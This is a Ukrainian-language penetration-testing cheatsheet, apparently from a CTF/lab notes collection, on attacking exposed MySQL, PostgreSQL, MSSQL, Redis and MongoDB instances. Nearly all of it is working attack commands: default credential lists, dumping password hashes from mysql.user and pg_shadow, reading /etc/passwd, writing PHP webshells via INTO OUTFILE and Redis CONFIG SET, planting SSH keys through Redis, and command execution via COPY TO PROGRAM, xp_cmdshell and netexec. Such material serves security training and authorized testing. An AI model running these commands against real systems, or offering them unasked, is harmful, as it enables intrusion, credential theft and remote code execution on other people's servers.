# Cheatsheet: Databases (MySQL / PostgreSQL / MSSQL / Redis / MongoDB)

Що робити, коли відкрита БД або є креди до неї: enum, дамп кредів/прапорців, читання/запис файлів, інколи RCE.
← [service-enum](../02-workflows/service-enum.md) · [credentials](../04-techniques/credentials-reuse.md) · веб-SQLi окремо: [sqlmap/SQLi](sqlmap-sqli.md)

> Спершу визначити рушій: nmap `-sV` (порт/банер). Типові порти: MySQL **3306**, PostgreSQL **5432**, MSSQL **1433**, Redis **6379**, MongoDB **27017**.
> Що шукати скрізь: таблиці/колекції `users/admin/accounts/config/flags/notes`, паролі (→ [reuse](../04-techniques/credentials-reuse.md)), прапорці у значеннях.

---

## Дефолтні / слабкі креди (спробувати першими)
| Рушій | Логін:пароль |
|---|---|
| MySQL | `root:` (порожній), `root:root`, `root:toor` |
| PostgreSQL | `postgres:postgres`, `postgres:` |
| MSSQL | `sa:` , `sa:sa`, `sa:Password123` |
| Redis | без автентифікації (найчастіше) |
| MongoDB | без автентифікації (найчастіше) |

---

## MySQL / MariaDB (3306)
```bash
mysql -h $TARGET -u root -p                     # інтерактивно
mysql -h $TARGET -u root -pPASS -e "SHOW DATABASES;"   # одна команда (без пробілу після -p)
```
```sql
SHOW DATABASES;  USE app;  SHOW TABLES;  SELECT * FROM users;
SELECT version(); SELECT current_user(); SELECT @@datadir;
SELECT user,authentication_string FROM mysql.user;        -- хеші юзерів БД (потрібні права)
-- знайти цікаві колонки по всіх базах:
SELECT table_schema,table_name,column_name FROM information_schema.columns
  WHERE column_name REGEXP 'pass|user|flag|secret';
-- читання файлу (потрібні FILE + secure_file_priv):
SELECT LOAD_FILE('/etc/passwd');
-- запис webshell:
SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php';
```

## PostgreSQL (5432)
```bash
PGPASSWORD=PASS psql -h $TARGET -U postgres          # уникнути запиту пароля
psql "postgresql://postgres:PASS@$TARGET:5432/postgres" -c "\l"
```
```sql
\l                      -- список баз      \c dbname    -- підключитись
\dt                     -- таблиці         \du          -- ролі
SELECT version();
SELECT usename,passwd FROM pg_shadow;        -- хеші (потрібен superuser)
SELECT * FROM users;
-- читання файлу:
CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;
-- RCE (superuser, PG 9.3+):
COPY (SELECT '') TO PROGRAM 'id';
```

## MSSQL (1433)
```bash
impacket-mssqlclient sa:PASS@$TARGET                  # або -windows-auth
netexec mssql $TARGET -u sa -p PASS -x whoami         # швидка перевірка + RCE
```
```sql
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;             -- бази
USE app; SELECT name FROM sys.tables;                 -- таблиці
-- RCE через xp_cmdshell (увімкнути, якщо вимкнено):
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Redis (6379) — часто без автентифікації <a id="redis"></a>
```bash
redis-cli -h $TARGET                    # без пароля
redis-cli -h $TARGET -a PASS            # з паролем (або AUTH pass усередині)
```
```
INFO                 # версія, ОС, конфіг (секція # Server, # Keyspace)
CONFIG GET dir       # робоча директорія (важливо для file-write)
CONFIG GET *         # уся конфігурація (паролі, шляхи)
SELECT 0             # перемкнути БД (0..15); DBSIZE — кількість ключів
KEYS *               # усі ключі (на малих інстансах)
TYPE <key>; GET <key>; LRANGE <key> 0 -1; HGETALL <key>   # читати значення за типом
```
Foothold через запис файлу (класика — потрібні права на запис у цільову теку):
```
# 1) webshell у веб-корінь
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']);?>"
SAVE                         # далі: http://$TARGET/shell.php?c=id

# 2) SSH-ключ (якщо Redis від юзера з ~/.ssh і запис дозволено)
CONFIG SET dir /home/<user>/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\n<публічний_ключ>\n\n"
SAVE                         # далі: ssh -i key <user>@$TARGET
```
> У RDB-файл потрапить трохи «сміття» навколо значення — для php/ssh це зазвичай не заважає. Module-load RCE — складніше, лишити на крайній випадок.

## MongoDB (27017)
```bash
mongosh --host $TARGET            # сучасний клієнт (або legacy: mongo)
```
```
show dbs;  use app;  show collections;
db.users.find().pretty();                 // усі документи
db.users.find({},{user:1,pass:1});        // конкретні поля
db.getCollectionNames();
```

## Куди далі
- Знайдені креди → перевірити на SSH/SMB/інших юзерах: [credentials-reuse](../04-techniques/credentials-reuse.md).
- Webshell з file-write → [webshells/revshells](webshells-revshells.md).
- БД слухає лише на `127.0.0.1` → пробросити: [pivoting](../02-workflows/pivoting-portforward.md).
